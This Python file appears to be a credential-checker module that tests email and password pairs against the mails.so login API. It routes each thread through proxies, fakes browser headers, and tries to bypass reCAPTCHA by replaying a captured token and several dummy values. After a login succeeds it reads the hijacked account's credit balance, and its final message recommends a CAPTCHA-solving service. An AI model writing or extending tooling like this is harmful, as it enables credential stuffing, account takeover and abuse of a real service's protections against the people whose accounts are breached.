"""
Checker for mails.so – with dummy token attempts.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://api.mails.so"
LOGIN_URL = BASE_URL + "/auth/login"
BILLING_URL = BASE_URL + "/client/billing/status?stripe=true"
TIMEOUT = 15

# The static token from the previous capture (may or may not work)
STATIC_TOKEN = "0cAFcWeA5QwgLXOu2LWkmRim_GMkuRZnKs2e6tUv7cVMRnJyStl4JLn6QARqUBK-z5DjKnluLuOPito37AQpUPetfhQunCT34XUwHxshDiIqppmRWEVQPn7bLHEmy1Nj9dL0Os7_9GSRwPCzK9QnaazgiW9GLHwcPWdqX1gQO4DJf_0yN0ZtaCbkoHMeA_XmD0xbSWt5JuUXx4hp8IgoqTxBl4TJ2xnc2CUHS1ULwGXQX8h0LfVbVC8n_2O-FMrvgR-Hi74smS-2IOIe5VTNkzoOtfTS0xOuN0ynKm78odYjudd5psC8DcdWbAUy9KGZJDy_kZWqf1Qw0Y2aswlXV926FGbyjRdNmk1vn22GtzcciJee51SnF04GhSs0Ta9dmmUAf9UvT77irOqRF_4Drkcuwfd4AOXBUUDix-bBzmPsQrVjULS92woYb3_ilh7dpGA79gKa4zTwC71tNk6xfYT9S1p0b15dLeOeW4w1T5Ndz_QM3PE89WV8QuaWiIT0qGgfHGZJcjurGFp34QQDSQG69LptX1r993JO_kAeJ-K4RsV_6bNDR2i4Gqe4Cq2ZrGvmbb7OHX-SgzHZ-X3FzCqhYLsUFxgYxYGIiu6xggaAZeebQt38ViFEW-b-U5lRtB39HE6NSsImHFa9ETSl6gqQXYV8Fpadz44WfR9PFgwHR2nJxvfv9ZHTE8DkiWP6gXpbyUmS8k3ak2Oy-haYTprH-tKlBvJqkRLaI1A3MIcGcUMaKPU6hU5Fgm9tEUq87mmT9TUtuna8hZqjsngA8VxOOSplDVSKtZ_fWHpKw-0IupC84L4aQe4KjVZXrmsxsC2AU-oixzd_p0rBMrtZqm8mwIyftpL_Skwdx2e1-EpTTBuPGUXpgouEGSesX8holYIsd62AuqNuHGRjnaAdStfT04SgKY8Igeovov_yHnfg9d0_YO6AH_7EhJaj81PGulh-lOJ4QxE--0XZ5hXquFAaveM-rCemYtF6bBynACNgoKx-VluCOS9iKRSzf9OXehtTI-1uBYQ6unvmgbUBKqaAwM5C2K6xL5ol7rqsuoaZv_-jI2kOmZxNLvx3ZXtsLDWNpz5npKTxNZPgev5WEkHIq1wlnShHp2PeNTBaBdCFmDHkORzp1-CRZTM5AlP5XFboC86Y84U3XoSYrugOOeJjW_AKP9TkYzRelmr3FqP08gzcFC_XTpoQ4O2kWUcJ6hMWMVAAwfbSsW2E6FaGPyvM885MDbQd6i4kjpITg_ZogAfVt4mPjMhHysNpAbd--097oY1QWSEJHN7pgo6Xx7FkMaZBeYJnjjtDp7TKjH4UboRwlBG1a-AGqvTciQWhfRFLi8-TUlIt_-0TtACHy6uJEcJH5cgI2OfPzipDXOTOSYdyzc1rFbaY9MJBxXAxaZYL-W5lLMBrS8K7SM71nR1zKk7sjXJhBQJPAywx0v1Wuh29zGsRWvDA0d6O7F_b_-N6O2VZlozCO8EZ3_J0l9flFc1mC1zRJgr556qqzyvSjR9LYRVcYXbIeYCRjExCW0bQOvnujZbtHds3c-4fd2jO81ypenkghpe0_6fSLQNP0AwCgN_qwSO7wxKggHdbr6BOyqupJcys8td2cNB-36yIYHTnT3B6XRDhN4LF839jsx-MbpaAhBsOysxaRbV4hRoh_LW18oT4d5-PgpCmhpcd9Eaqn6F9LAnsrMS82h9urCgM8DyDxH01aNRl5AeocKI-IzG4QMijNyDLvtSgPNuIGzj43Lge-qgjVk4Yo06CPg-lOo3ILQRD_PKwpMRZt_2-QZAr3Qlo2JLzsXftSGUrm8DAf7pQexpW2wSjyjyJFEyFa8RHewiSCk25AhD6t8BEer-C0qzbIdLnQyF01aIE-LQmTX7Y5tDlxp7AR2MA5_TJLyrtFS_2sYznmmC_G78XGuwJomjp4UvGyPLTI9C0nBsatgz-sDdifAbPXBA9tWGdGW7a5YwLUkXSrpQpuIfwu0BQ-J6-y2O64KSkIuUDDrBIGUyd2jUycHux96UND6duqDG3yrScnBI_LYXv_f5sOhZdKgOEVuQT1wUDcw5c2CA975BdPuuMEX7y7w4_t2UVrYVMnLZKIhe4GwBHaSI6JOotgjsu5CucjOEfZ_NfOS3mHTTdS8Lgr7Ib4Bq0NJKwP4DCdQb9tnP1mrtvbzkUeNy09jPVFyskaPHcOPvsEgjcZH8P6YwUwlGrFYoKmE9ojyPJqPt6FotBZW6FV3XQ0wNV2ZY4HEJpb0VTlE2hKSV1UY9tNjG0HAZSiBzkKu-RTybWbmMFs5yKSu5F2gGejBZ8KFlWNhiez79YPshMIquTKgmlVKaI7KUCgneVbUdz-tLPwGXNg"

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mails.so",
        "Referer": "https://mails.so/login",
    })

    # List of token candidates to try (in order)
    tokens_to_try = [
        None,                # no token
        "dummy_token",       # dummy
        STATIC_TOKEN,        # captured token
        "",                  # empty string
        "test",              # another dummy
        "recaptchaToken"     # placeholder
    ]

    for token in tokens_to_try:
        payload = {"email": email, "password": password}
        if token is not None:
            payload["recaptchaToken"] = token

        try:
            resp = session.post(LOGIN_URL, json=payload, timeout=TIMEOUT)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "success" or data.get("message") == "Logged in":
                    # Success – fetch credits
                    # Extract token for subsequent requests
                    auth_token = None
                    for key in ["token", "access_token", "jwt", "data.token", "data.access_token"]:
                        parts = key.split(".")
                        val = data
                        for part in parts:
                            if isinstance(val, dict) and part in val:
                                val = val[part]
                            else:
                                val = None
                                break
                        if val:
                            auth_token = val
                            break
                    if auth_token:
                        session.headers.update({"Authorization": f"Bearer {auth_token}"})

                    # Fetch credits
                    try:
                        bill_resp = session.get(BILLING_URL, timeout=TIMEOUT)
                        if bill_resp.status_code == 200:
                            bill_data = bill_resp.json()
                            balance = bill_data.get("balance", {})
                            monthly = balance.get("remaining_monthly", 0)
                            extra = balance.get("remaining_extra", 0)
                            total = monthly + extra
                            return True, f"Login successful. Credits: {total} (monthly: {monthly}, extra: {extra})"
                        else:
                            return True, f"Login successful (could not fetch credits: HTTP {bill_resp.status_code})"
                    except Exception as e:
                        return True, f"Login successful (could not fetch credits: {str(e)})"

                # If we got an error message, continue to next token
                msg = data.get("message", "")
                if "recaptcha" in msg.lower() or "captcha" in msg.lower():
                    continue  # try next token
                else:
                    # If it's a different error, return it
                    return False, f"Login failed: {msg}"

            else:
                # Non-200 – try next token
                continue

        except Exception:
            continue

    return False, "Login failed – all token attempts failed (likely reCAPTCHA required). Consider using a solving service or obtaining a valid token."